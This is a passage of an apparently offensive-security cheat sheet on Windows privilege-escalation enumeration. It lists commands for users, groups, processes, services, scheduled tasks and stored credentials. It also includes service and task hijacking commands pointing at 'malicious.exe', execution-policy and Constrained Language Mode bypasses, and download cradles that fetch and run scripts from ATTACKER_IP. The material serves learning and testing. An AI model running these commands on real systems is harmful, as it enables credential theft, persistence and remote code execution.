# Find enabled users
Get-LocalUser | Where-Object {$_.Enabled -eq $true}

# Find users with password never expires
Get-LocalUser | Where-Object {$_.PasswordExpires -eq $null}

# Check if user exists
Get-LocalUser -Name "hacker" -ErrorAction SilentlyContinue
```

#### PowerShell Get-LocalGroup and Members

```powershell
# List all local groups
Get-LocalGroup

# List members of specific group
Get-LocalGroupMember -Group "Administrators"

# List all groups and their members
Get-LocalGroup | ForEach-Object {
    Write-Host "`n[$($_.Name)]" -ForegroundColor Cyan
    Get-LocalGroupMember -Group $_.Name | Select-Object Name, PrincipalSource
}

# Check if current user is admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "Is Administrator: $isAdmin"
```

#### WMI User Enumeration

```powershell
# List local users via WMI
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"

# Specific properties
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True" | Select-Object Name, SID, Disabled, PasswordRequired

# List local groups via WMI
Get-WmiObject -Class Win32_Group -Filter "LocalAccount=True"

# Get current user details
Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName
```

#### Active Directory User Enumeration

```cmd
# Requires domain-joined machine

# List domain users
net user /domain

# Domain user details
net user username /domain

# Domain groups
net group /domain

# Domain Admins
net group "Domain Admins" /domain

# Enterprise Admins
net group "Enterprise Admins" /domain

# Domain Controllers
net group "Domain Controllers" /domain
```

```powershell
# PowerShell Active Directory queries (requires RSAT or AD module)
# Import AD module
Import-Module ActiveDirectory

# List all domain users
Get-ADUser -Filter *

# List domain admins
Get-ADGroupMember -Identity "Domain Admins"

# Find privileged users
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount

# Find users with SPN (Kerberoastable)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### Logged-in Users and Sessions

```cmd
# Currently logged in users
query user
qwinsta

# User sessions
quser

# Display session information
query session
```

```powershell
# PowerShell logged-in users
Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName

# Get logon sessions
Get-WmiObject -Class Win32_LogonSession

# Get detailed logon information
Get-WmiObject -Class Win32_LoggedOnUser | Select-Object Antecedent, Dependent
```

#### Recent User Activity

```cmd
# Recent RDP connections (logged in user's registry)
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"

# Recent documents
dir %APPDATA%\Microsoft\Windows\Recent

# Recent run commands
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
```

```powershell
# PowerShell command history
Get-History
Get-Content (Get-PSReadlineOption).HistorySavePath

# Event log for user logons (requires admin)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 20 | Select-Object TimeCreated, Message
```

#### Credential Enumeration

```cmd
# List stored credentials (Windows Credential Manager)
cmdkey /list

# List cached credentials (requires admin)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Check for autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

```powershell
# Enumerate saved credentials via PowerShell
$creds = cmdkey /list
$creds

# Check for unattend.xml files (often contain credentials)
Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.inf,sysprep.xml -Recurse -ErrorAction SilentlyContinue

# Search for password in files
Get-ChildItem -Path C:\Users -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive:$false
```

#### Permission and Token Information

```cmd
# Check file permissions on specific file
icacls "C:\Program Files\vulnerable.exe"

# Check service permissions
sc sdshow servicename

# Accesschk from Sysinternals (requires download)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
```

```powershell
# Get ACL of file or directory
Get-Acl -Path "C:\Program Files\Application"

# Check service permissions
Get-Service | ForEach-Object {
    $service = Get-WmiObject -Class Win32_Service -Filter "Name='$($_.Name)'"
    $service | Select-Object Name, StartMode, State, PathName
}

# Find services with weak permissions
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch "C:\\Windows"} | Select-Object Name, PathName, StartMode, State
```

---

### Group Membership

Group membership enumeration reveals privilege boundaries, identifies administrative access, and exposes potential escalation paths through group-based permissions.

#### net localgroup Command

```cmd
# List all local groups
net localgroup

# List members of Administrators group
net localgroup Administrators

# List Remote Desktop Users
net localgroup "Remote Desktop Users"

# List Backup Operators (high-privilege group)
net localgroup "Backup Operators"

# List all groups with details
net localgroup | findstr /v "The command"
```

**Critical local groups for privilege escalation:**

- **Administrators**: Full system control
- **Backup Operators**: SeBackupPrivilege, SeRestorePrivilege
- **Remote Desktop Users**: RDP access
- **Remote Management Users**: WinRM/PSRemoting access
- **Distributed COM Users**: DCOM exploitation potential
- **Event Log Readers**: Security log access
- **Hyper-V Administrators**: VM escape potential

#### Domain Group Enumeration

```cmd
# List domain groups (requires domain membership)
net group /domain

# Domain Admins
net group "Domain Admins" /domain

# Enterprise Admins
net group "Enterprise Admins" /domain

# Schema Admins
net group "Schema Admins" /domain

# Account Operators
net group "Account Operators" /domain

# Server Operators
net group "Server Operators" /domain

# Print Operators
net group "Print Operators" /domain

# Domain Controllers
net group "Domain Controllers" /domain
```

#### PowerShell Get-LocalGroupMember

```powershell
# List all local groups
Get-LocalGroup

# List Administrators group members
Get-LocalGroupMember -Group "Administrators"

# Enumerate all groups and their members
Get-LocalGroup | ForEach-Object {
    $groupName = $_.Name
    Write-Host "`n=== $groupName ===" -ForegroundColor Cyan
    try {
        Get-LocalGroupMember -Group $groupName | Select-Object Name, PrincipalSource, ObjectClass
    } catch {
        Write-Host "Cannot enumerate members" -ForegroundColor Yellow
    }
}

# Check if specific user is in Administrators
Get-LocalGroupMember -Group "Administrators" | Where-Object {$_.Name -like "*username*"}

# Find all groups a specific user belongs to
$username = $env:USERNAME
Get-LocalGroup | ForEach-Object {
    $members = Get-LocalGroupMember -Group $_.Name -ErrorAction SilentlyContinue
    if ($members.Name -contains "$env:COMPUTERNAME\$username") {
        Write-Host "Member of: $($_.Name)"
    }
}
```

#### Advanced Group Enumeration

```powershell
# Get current user's group memberships
whoami /groups

# Format for readability
whoami /groups /fo table

# Check for high-integrity groups
whoami /groups | findstr /i "High Mandatory Level"
whoami /groups | findstr /i "S-1-16-12288"

# WMI-based group enumeration
Get-WmiObject -Class Win32_Group -Filter "LocalAccount=True" | Select-Object Name, SID

# Get group by SID
Get-LocalGroup | Where-Object {$_.SID -like "S-1-5-32-544"}  # Administrators

# Check domain trust relationships
nltest /domain_trusts
```

#### Group Policy Information

```cmd
# Display applied Group Policy
gpresult /R

# Detailed HTML report (saves to C:\gpresult.html)
gpresult /H C:\gpresult.html /F

# Show group policy for specific user
gpresult /USER username /R

# Remote system GP results (requires admin)
gpresult /S hostname /R
```

```powershell
# PowerShell Group Policy retrieval
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\gpreport.html

# List GPOs
Get-GPO -All

# Get applied GPOs
gpresult /Scope Computer /v
```

### Running Processes

Process enumeration identifies vulnerable services, privilege escalation opportunities through DLL hijacking, and potential credential harvesting targets.

#### tasklist Command

```cmd
# List all running processes
tasklist

# Detailed verbose output with services
tasklist /v

# Show processes with modules (DLLs)
tasklist /m

# Show processes with services
tasklist /svc

# Filter by process name
tasklist | findstr /i "explorer.exe"

# Show processes by specific user
tasklist /fi "USERNAME eq SYSTEM"

# Filter by memory usage (greater than 50MB)
tasklist /fi "MEMUSAGE gt 51200"

# Show processes with PID
tasklist /fi "PID eq 1234"

# Output to CSV
tasklist /fo csv > C:\temp\processes.csv

# Output formatted table
tasklist /fo table /v
```

#### Advanced tasklist Filtering

```cmd
# Find specific executable
tasklist /fi "IMAGENAME eq lsass.exe"

# Processes running as SYSTEM
tasklist /v | findstr "SYSTEM"

# Find processes with specific window title
tasklist /fi "WINDOWTITLE eq Calculator"

# Running status filter
tasklist /fi "STATUS eq running"

# Not responding processes
tasklist /fi "STATUS eq Not Responding"

# Processes with high memory usage
tasklist /fi "MEMUSAGE gt 102400"

# Services hosted in svchost
tasklist /svc | findstr /i "svchost"
```

#### PowerShell Get-Process

```powershell
# List all processes
Get-Process

# Sort by CPU usage
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10

# Sort by memory usage
Get-Process | Sort-Object WS -Descending | Select-Object -First 10 Name, @{N="Memory(MB)";E={[math]::Round($_.WS/1MB,2)}}

# Get specific process details
Get-Process -Name lsass

# Get process by PID
Get-Process -Id 1234

# Include process owner
Get-Process | Select-Object ProcessName, Id, @{N="Owner";E={$_.GetOwner().User}}

# Full process details including command line
Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine

# Filter processes by owner
Get-WmiObject Win32_Process | Where-Object {$_.GetOwner().User -eq "SYSTEM"} | Select-Object Name, ProcessId
```

#### Process Analysis for Privilege Escalation

```powershell
# Find processes running as SYSTEM
Get-WmiObject Win32_Process | Where-Object {
    $owner = $_.GetOwner()
    $owner.Domain -eq "NT AUTHORITY" -and $owner.User -eq "SYSTEM"
} | Select-Object Name, ProcessId, CommandLine

# Check for unquoted service paths in running processes
Get-WmiObject Win32_Process | Where-Object {
    $_.CommandLine -match '^[^"].*\s.*\.exe' -and $_.CommandLine -notmatch '^"'
} | Select-Object Name, ProcessId, CommandLine

# Find processes with specific DLLs loaded
tasklist /m kernel32.dll

# List all modules for specific process
Get-Process -Name chrome | Select-Object -ExpandProperty Modules

# Check process integrity level
Get-Process | ForEach-Object {
    $process = $_
    try {
        $handle = [System.Diagnostics.Process]::GetProcessById($process.Id).Handle
        # [Inference: Full integrity level extraction requires Win32 API calls]
        Write-Host "$($process.Name) - PID: $($process.Id)"
    } catch {}
}
```

#### Process Network Connections

```cmd
# Processes with network connections
netstat -ano | findstr ESTABLISHED

# Find which process is using specific port
netstat -ano | findstr :445
```

```powershell
# Get network connections with process names
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, @{N="Process";E={(Get-Process -Id $_.OwningProcess).Name}} | Format-Table

# Find processes listening on ports
Get-NetTCPConnection -State Listen | Select-Object LocalPort, @{N="Process";E={(Get-Process -Id $_.OwningProcess).ProcessName}} | Sort-Object LocalPort

# Established connections with full details
Get-NetTCPConnection -State Established | ForEach-Object {
    $process = Get-Process -Id $_.OwningProcess
    [PSCustomObject]@{
        Process = $process.Name
        PID = $_.OwningProcess
        LocalAddress = $_.LocalAddress
        LocalPort = $_.LocalPort
        RemoteAddress = $_.RemoteAddress
        RemotePort = $_.RemotePort
    }
}
```

#### Identifying Vulnerable Processes

```powershell
# Processes running from user-writable directories
Get-WmiObject Win32_Process | Where-Object {
    $_.ExecutablePath -match "^C:\\Users\\" -or 
    $_.ExecutablePath -match "^C:\\Temp\\" -or
    $_.ExecutablePath -match "^C:\\ProgramData\\"
} | Select-Object Name, ProcessId, ExecutablePath

# Check file permissions on process executables
Get-Process | Where-Object {$_.Path} | ForEach-Object {
    $acl = Get-Acl -Path $_.Path -ErrorAction SilentlyContinue
    if ($acl) {
        [PSCustomObject]@{
            Process = $_.Name
            Path = $_.Path
            Owner = $acl.Owner
        }
    }
} | Format-Table

# Find processes with missing executables (phantom processes)
Get-WmiObject Win32_Process | Where-Object {
    $_.ExecutablePath -and -not (Test-Path $_.ExecutablePath)
} | Select-Object Name, ProcessId, ExecutablePath
```

### Services

Service enumeration reveals potential privilege escalation vectors through unquoted paths, weak permissions, and misconfigured service accounts.

#### sc query Command

```cmd
# List all services
sc query

# List all services including stopped
sc query state= all

# Specific service details
sc query servicename

# Query service configuration
sc qc servicename

# Show service description
sc qdescription servicename

# Show service failure actions
sc qfailure servicename

# Find services in specific state
sc query state= running
sc query state= stopped
sc query state= paused

# Query service by type
sc query type= service
sc query type= driver
```

#### Service Configuration Details

```cmd
# Get detailed service configuration
sc qc wuauserv

# Check service start type
sc qc servicename | findstr START_TYPE

# Check service account
sc qc servicename | findstr SERVICE_START_NAME

# Show service dependencies
sc enumdepend servicename

# Show services that depend on specific service
sc enumdepend servicename

# Query failure actions
sc qfailure servicename

# Get service SID
sc showsid servicename
```

#### Service Permission Enumeration

```cmd
# Show service security descriptor
sc sdshow servicename

# Common vulnerable permissions to check:
# DC - SERVICE_CHANGE_CONFIG
# WD - WRITE_DAC
# WO - WRITE_OWNER

# Using icacls on service binary
icacls "C:\Program Files\Service\service.exe"

# Check if writable by current user
icacls "C:\Program Files\Service\service.exe" | findstr /i "BUILTIN\\Users"
```

**Service permission flags:**

- **SERVICE_ALL_ACCESS (F)**: Full control
- **SERVICE_CHANGE_CONFIG (DC)**: Can reconfigure service
- **WRITE_DAC (WD)**: Can modify permissions
- **WRITE_OWNER (WO)**: Can take ownership

#### PowerShell Get-Service

```powershell
# List all services
Get-Service

# Show running services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Show stopped services
Get-Service | Where-Object {$_.Status -eq "Stopped"}

# Get specific service
Get-Service -Name wuauserv

# Services that can be started
Get-Service | Where-Object {$_.StartType -ne "Disabled"}

# Display service details
Get-Service | Select-Object Name, Status, StartType, DisplayName

# Export to CSV
Get-Service | Export-Csv -Path C:\temp\services.csv -NoTypeInformation
```

#### Advanced Service Enumeration

```powershell
# Get service configuration including binary path
Get-WmiObject Win32_Service | Select-Object Name, State, StartMode, PathName

# Services running as SYSTEM
Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, State, PathName

# Services with specific start mode
Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select-Object Name, State, PathName

# Get service executable paths
Get-WmiObject Win32_Service | Select-Object Name, @{N="ExecutablePath";E={$_.PathName -replace '^"?([^"]+).*','$1'}}

# Check if service binary exists
Get-WmiObject Win32_Service | ForEach-Object {
    $exePath = $_.PathName -replace '^"?([^"]+).*','$1'
    if (-not (Test-Path $exePath)) {
        [PSCustomObject]@{
            ServiceName = $_.Name
            MissingPath = $exePath
        }
    }
}
```

#### Unquoted Service Path Detection

```cmd
# WMIC method
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Find unquoted paths with spaces
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """ | findstr " "
```

```powershell
# PowerShell unquoted service path detection
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch '^".*"' -and 
    $_.PathName -match '.* .*\.exe'
} | Select-Object Name, PathName, StartName, State

# Detailed unquoted path analysis
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName
    if ($path -notmatch '^"' -and $path -match ' ' -and $path -match '\.exe') {
        # Extract executable path
        $exePath = ($path -split '\.exe')[0] + '.exe'
        
        [PSCustomObject]@{
            ServiceName = $_.Name
            PathName = $_.PathName
            StartMode = $_.StartMode
            ServiceAccount = $_.StartName
            State = $_.State
        }
    }
} | Format-Table -AutoSize
```

#### Service Permissions Check

```powershell
# Check service binary permissions
Get-WmiObject Win32_Service | ForEach-Object {
    $servicePath = $_.PathName -replace '^"?([^"]+).*','$1'
    
    if (Test-Path $servicePath) {
        $acl = Get-Acl $servicePath
        $writeAccess = $acl.Access | Where-Object {
            ($_.FileSystemRights -match "Write|FullControl|Modify") -and
            ($_.IdentityReference -match "Users|Everyone|BUILTIN\\Users")
        }
        
        if ($writeAccess) {
            [PSCustomObject]@{
                Service = $_.Name
                Path = $servicePath
                VulnerablePermissions = ($writeAccess.IdentityReference -join ", ")
            }
        }
    }
}

# Check service directory permissions
Get-WmiObject Win32_Service | ForEach-Object {
    $servicePath = $_.PathName -replace '^"?([^"]+).*','$1'
    $directory = Split-Path $servicePath
    
    if (Test-Path $directory) {
        $acl = Get-Acl $directory
        $writeAccess = $acl.Access | Where-Object {
            ($_.FileSystemRights -match "Write|FullControl|Modify") -and
            ($_.IdentityReference -match "Users|Everyone")
        }
        
        if ($writeAccess) {
            [PSCustomObject]@{
                Service = $_.Name
                Directory = $directory
                Permissions = ($writeAccess.FileSystemRights -join ", ")
            }
        }
    }
}
```

#### Service Manipulation

```cmd
# Start service
sc start servicename

# Stop service
sc stop servicename

# Change service binary path (requires admin)
sc config servicename binPath= "C:\temp\evil.exe"

# Change service start type
sc config servicename start= auto
sc config servicename start= demand
sc config servicename start= disabled

# Change service account
sc config servicename obj= LocalSystem

# Create new service (requires admin)
sc create MyService binPath= "C:\malicious.exe" start= auto

# Delete service
sc delete servicename
```

```powershell
# PowerShell service manipulation
Start-Service -Name servicename
Stop-Service -Name servicename
Restart-Service -Name servicename

# Change service startup type
Set-Service -Name servicename -StartupType Automatic

# Create new service
New-Service -Name "MyService" -BinaryPathName "C:\path\to\executable.exe" -StartupType Automatic
```

### Scheduled Tasks

Scheduled task enumeration reveals persistence mechanisms, privilege escalation opportunities through task modification, and credential harvesting targets.

#### schtasks Command

```cmd
# List all scheduled tasks
schtasks

# Detailed verbose output
schtasks /query /v

# Output to CSV
schtasks /query /fo csv > C:\temp\tasks.csv

# Output formatted list
schtasks /query /fo list

# Show tasks with specific state
schtasks /query /v | findstr "Running"
schtasks /query /v | findstr "Ready"

# Query specific task
schtasks /query /tn "TaskName" /v

# Show task details in XML format
schtasks /query /tn "TaskName" /xml
```

#### Filtering Scheduled Tasks

```cmd
# Filter by folder
schtasks /query /fo list | findstr /i "TaskName Folder Status"

# Tasks running as SYSTEM
schtasks /query /v /fo list | findstr /i "SYSTEM"

# Tasks with specific run time
schtasks /query /v | findstr "Next Run Time"

# Recently modified tasks
schtasks /query /v /fo list | findstr /i "Author Task To Run"

# Find tasks in specific path
schtasks /query /tn "\Microsoft\Windows\*"
```

#### PowerShell Get-ScheduledTask

```powershell
# List all scheduled tasks (PowerShell 4.0+)
Get-ScheduledTask

# Show only enabled tasks
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

# Show ready/running tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}

# Get specific task details
Get-ScheduledTask -TaskName "TaskName"

# Get tasks in specific folder
Get-ScheduledTask -TaskPath "\Microsoft\Windows\*"

# Export to CSV
Get-ScheduledTask | Export-Csv -Path C:\temp\tasks.csv -NoTypeInformation
```

#### Detailed Task Information

```powershell
# Get task details with actions
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $info = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath -ErrorAction SilentlyContinue
    
    [PSCustomObject]@{
        TaskName = $task.TaskName
        State = $task.State
        LastRunTime = $info.LastRunTime
        NextRunTime = $info.NextRunTime
        LastResult = $info.LastTaskResult
        Author = $task.Author
    }
} | Format-Table

# Get task actions (executables/scripts)
Get-ScheduledTask | ForEach-Object {
    $actions = $_.Actions
    foreach ($action in $actions) {
        [PSCustomObject]@{
            TaskName = $_.TaskName
            Execute = $action.Execute
            Arguments = $action.Arguments
            WorkingDirectory = $action.WorkingDirectory
        }
    }
} | Where-Object {$_.Execute} | Format-Table

# Get task principals (user context)
Get-ScheduledTask | Select-Object TaskName, @{N="Principal";E={$_.Principal.UserId}}
```

#### Vulnerability Assessment of Tasks

```powershell
# Find tasks running as SYSTEM/Administrator
Get-ScheduledTask | Where-Object {
    $_.Principal.UserId -match "SYSTEM|Administrator"
} | Select-Object TaskName, @{N="RunAs";E={$_.Principal.UserId}}, State

# Find tasks with writable executable paths
Get-ScheduledTask | ForEach-Object {
    $task = $_
    foreach ($action in $_.Actions) {
        if ($action.Execute) {
            $exePath = $action.Execute
            
            # Check if path exists and is writable
            if (Test-Path $exePath) {
                $acl = Get-Acl $exePath -ErrorAction SilentlyContinue
                $writeAccess = $acl.Access | Where-Object {
                    ($_.FileSystemRights -match "Write|FullControl|Modify") -and
                    ($_.IdentityReference -match "Users|Everyone|$env:USERNAME")
                }
                
                if ($writeAccess) {
                    [PSCustomObject]@{
                        TaskName = $task.TaskName
                        ExecutablePath = $exePath
                        RunAs = $task.Principal.UserId
                        Vulnerable = "Writable by current user"
                    }
                }
            }
        }
    }
}

# Find tasks with unquoted paths containing spaces
Get-ScheduledTask | ForEach-Object {
    foreach ($action in $_.Actions) {
        if ($action.Execute -match '^[^"].*\s.*\.exe') {
            [PSCustomObject]@{
                TaskName = $_.TaskName
                UnquotedPath = $action.Execute
                Principal = $_.Principal.UserId
            }
        }
    }
} | Format-Table
```

#### Task Execution Analysis

```powershell
# Get task history (requires admin)
Get-ScheduledTask | ForEach-Object {
    $taskInfo = Get-ScheduledTaskInfo -TaskName $_.TaskName -TaskPath $_.TaskPath -ErrorAction SilentlyContinue
    
    [PSCustomObject]@{
        TaskName = $_.TaskName
        LastRunTime = $taskInfo.LastRunTime
        NextRunTime = $taskInfo.NextRunTime
        NumberOfMissedRuns = $taskInfo.NumberOfMissedRuns
        LastResult = $taskInfo.LastTaskResult
    }
} | Where-Object {$_.LastRunTime} | Sort-Object LastRunTime -Descending

# Check task triggers
Get-ScheduledTask | ForEach-Object {
    $task = $_
    foreach ($trigger in $_.Triggers) {
        [PSCustomObject]@{
            TaskName = $task.TaskName
            TriggerType = $trigger.CimClass.CimClassName
            Enabled = $trigger.Enabled
        }
    }
} | Format-Table
```

#### Legacy Task Enumeration (Windows XP/2003)

```cmd
# AT command (deprecated but sometimes works)
at

# List scheduled tasks via registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" /s
```

#### Task Manipulation

```cmd
# Create new task (requires admin)
schtasks /create /tn "MyTask" /tr "C:\malicious.exe" /sc daily /st 12:00 /ru SYSTEM

# Run task immediately
schtasks /run /tn "TaskName"

# Delete task
schtasks /delete /tn "TaskName" /f

# Change task
schtasks /change /tn "TaskName" /tr "C:\new_executable.exe"

# Disable task
schtasks /change /tn "TaskName" /disable
```

```powershell
# PowerShell task manipulation
# Create new task
$action = New-ScheduledTaskAction -Execute "C:\script.exe"
$trigger = New-ScheduledTaskTrigger -Daily -At 3am
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "MyTask" -Action $action -Trigger $trigger -Principal $principal

# Start task
Start-ScheduledTask -TaskName "MyTask"

# Disable task
Disable-ScheduledTask -TaskName "MyTask"

# Remove task
Unregister-ScheduledTask -TaskName "MyTask" -Confirm:$false
```

#### Checking Task Permissions

```powershell
# Check task file permissions
$taskPath = "C:\Windows\System32\Tasks"
Get-ChildItem $taskPath -Recurse -File | ForEach-Object {
    $acl = Get-Acl $_.FullName
    $writeAccess = $acl.Access | Where-Object {
        ($_.FileSystemRights -match "Write|FullControl|Modify") -and
        ($_.IdentityReference -match "Users|Everyone|$env:USERNAME")
    }
    
    if ($writeAccess) {
        [PSCustomObject]@{
            TaskFile = $_.FullName
            Owner = $acl.Owner
            VulnerablePermissions = ($writeAccess.IdentityReference -join ", ")
        }
    }
}

# Check task folder permissions
Get-Acl "C:\Windows\System32\Tasks" | Select-Object -ExpandProperty Access | Format-Table
```

----

### PowerShell Version and Execution Policy

#### PowerShell Version Enumeration

**Check PowerShell version:**

```powershell
# Current PowerShell version
$PSVersionTable

# Specific version info
$PSVersionTable.PSVersion

# Detailed output
$PSVersionTable | Format-List

# Major version only
$PSVersionTable.PSVersion.Major
```

**Output interpretation:**

```
Name                           Value
----                           -----
PSVersion                      5.1.19041.1682
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.1682
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
```

**Key fields:**

- `PSVersion` - PowerShell version number
- `PSEdition` - Desktop (Windows PowerShell) or Core (PowerShell 7+)
- `CLRVersion` - .NET CLR version
- `PSCompatibleVersions` - Compatible with these versions

**Alternative version checks:**

```powershell
# Using host information
$Host.Version

# Get PowerShell executable version
Get-Command powershell | Select-Object -ExpandProperty Version

# Check installed PowerShell versions
Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\PowerShell\* | Get-ItemProperty

# PowerShell Core (pwsh) version
pwsh -Version
```

**Check for PowerShell Core (v6+/v7+):**

```powershell
# Check if pwsh.exe exists
Get-Command pwsh -ErrorAction SilentlyContinue

# List all PowerShell installations
Get-ChildItem "C:\Program Files\PowerShell\" -ErrorAction SilentlyContinue
```

#### Execution Policy Enumeration

**Check current execution policy:**

```powershell
# Current user scope
Get-ExecutionPolicy

# All scopes
Get-ExecutionPolicy -List

# Specific scope
Get-ExecutionPolicy -Scope CurrentUser
Get-ExecutionPolicy -Scope LocalMachine
Get-ExecutionPolicy -Scope Process
```

**Output format:**

```
Scope            ExecutionPolicy
-----            ---------------
MachinePolicy    Undefined
UserPolicy       Undefined
Process          Undefined
CurrentUser      RemoteSigned
LocalMachine     Restricted
```

**Execution policy levels:**

- `Restricted` - No scripts allowed (default on Windows clients)
- `AllSigned` - Only signed scripts by trusted publisher
- `RemoteSigned` - Local scripts run unsigned, downloaded scripts must be signed
- `Unrestricted` - All scripts run, warns on downloaded scripts
- `Bypass` - No restrictions, no warnings
- `Undefined` - No policy set at this scope

**Check effective policy:**

```powershell
# The most restrictive policy wins
Get-ExecutionPolicy -Scope MachinePolicy
Get-ExecutionPolicy -Scope UserPolicy

# If both are Undefined, then Process/CurrentUser/LocalMachine apply
```

#### Execution Policy Bypass Techniques

**Command-line bypass:**

```powershell
# Bypass for current session
powershell -ExecutionPolicy Bypass -File script.ps1

# Alternative syntax
powershell -ep bypass -file script.ps1

# No profile loading
powershell -noprofile -executionpolicy bypass -file script.ps1
```

**Download and execute without touching disk:**

```powershell
# IEX (Invoke-Expression) download cradle
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')"

# Using Invoke-WebRequest
powershell -ep bypass -c "IEX(IWR -UseBasicParsing http://ATTACKER_IP/script.ps1)"

# Alternative download cradle
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')"
```

**Encoding bypass:**

```powershell
# Base64 encode command
$command = 'Write-Host "Bypassed"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Execute encoded command (bypasses execution policy)
powershell -EncodedCommand $encoded

# One-liner encoding
powershell -enc [BASE64_STRING]
```

**Read script as stdin:**

```powershell
# Cat script content and pipe to PowerShell
Get-Content script.ps1 | powershell -noprofile -

# From command line
type script.ps1 | powershell -noprofile -
```

**Copy-paste execution:**

```powershell
# Script content doesn't need execution policy
# Simply copy and paste script contents into PowerShell prompt
```

**Function invocation:**

```powershell
# Define function directly in console
function Invoke-Evil { Write-Host "Bypassed" }
Invoke-Evil
```

#### PowerShell Logging and Detection Enumeration

**Check PowerShell logging status:**

```powershell
# Script Block Logging
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue

# Module Logging
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue

# Transcription Logging
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue
```

**Check if logging is enabled:**

```powershell
# Script Block Logging status
$sbl = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -ErrorAction SilentlyContinue
if ($sbl.EnableScriptBlockLogging -eq 1) { 
    Write-Host "Script Block Logging ENABLED" 
}

# Transcription output path
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -ErrorAction SilentlyContinue
```

**PowerShell event logs:**

```powershell
# PowerShell operational log
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 10 | Format-List

# Check for suspicious events
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} -MaxEvents 10

# Windows PowerShell log
Get-WinEvent -LogName "Windows PowerShell" -MaxEvents 10
```

#### Constrained Language Mode Detection

**Check language mode:**

```powershell
# Current language mode
$ExecutionContext.SessionState.LanguageMode
```

**Possible values:**

- `FullLanguage` - All features available (normal mode)
- `ConstrainedLanguage` - Restricted features (AppLocker/Device Guard)
- `RestrictedLanguage` - Very limited functionality
- `NoLanguage` - No scripting allowed

**Test for restrictions:**

```powershell
# Try to access restricted type
[System.Runtime.InteropServices.Marshal]

# If ConstrainedLanguage, will return error
```

**Constrained Language Mode bypass attempts:**

```powershell
# PowerShell v2 downgrade (if available)
powershell -version 2

# Check if v2 installed
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

# COM object abuse (may work)
$comObject = [Type]::GetTypeFromProgID("WScript.Shell")
$instance = [Activator]::CreateInstance($comObject)
$instance.Run("cmd.exe")
```

[Inference] PowerShell v2 downgrade may bypass Constrained Language Mode, but v2 is often removed or disabled on modern systems for security reasons.

### Recently Accessed Files

#### Recent Documents Enumeration

**User's recent folder:**

```powershell
# List recent items
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Force

# With details
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Force | Select-Object Name, LastWriteTime, Target

# Resolve shortcuts
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\*.lnk" -Force | ForEach-Object {
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($_.FullName)
    [PSCustomObject]@{
        Name = $_.Name
